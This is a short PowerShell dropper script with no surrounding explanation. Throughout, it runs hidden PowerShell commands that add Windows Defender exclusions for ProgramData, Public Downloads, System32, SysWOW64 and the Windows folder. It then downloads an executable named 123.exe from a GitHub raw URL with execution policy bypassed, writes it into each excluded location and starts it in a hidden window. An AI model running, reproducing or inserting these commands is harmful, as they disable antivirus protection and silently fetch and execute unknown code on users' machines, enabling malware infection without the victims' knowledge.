powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath 'C:\ProgramData'"

powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionExtension 'C:\Users\Public\Downloads\123.exe'"
powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath 'C:\Users\Public\Downloads'"
powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'https://github.com/AmjadBalls/TEST/raw/refs/heads/main/123.exe' -OutFile 'C:\Users\Public\Downloads\123.exe'"
Start-Process "C:\Users\Public\Downloads\123.exe" -WindowStyle Hidden

powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionExtension 'C:\Windows\System32\123.exe'"
powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath 'C:\Windows\System32'"
powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'https://github.com/AmjadBalls/TEST/raw/refs/heads/main/123.exe' -OutFile 'C:\Windows\System32\123.exe'"
Start-Process "C:\Windows\System32\123.exe" -WindowStyle Hidden

powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionExtension 'C:\Windows\SysWOW64\123.exe'"
powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath 'C:\Windows\SysWOW64'"
powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'https://github.com/AmjadBalls/TEST/raw/refs/heads/main/123.exe' -OutFile 'C:\Windows\SysWOW64\123.exe'"
Start-Process "C:\Windows\SysWOW64\123.exe" -WindowStyle Hidden

powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionExtension 'C:\Windows\SysWOW64\123.exe'"
powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath 'C:\Windows'"
powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'https://github.com/AmjadBalls/TEST/raw/refs/heads/main/123.exe' -OutFile 'C:\Windows\123.exe'"
Start-Process "C:\Windows\123.exe" -WindowStyle Hidden
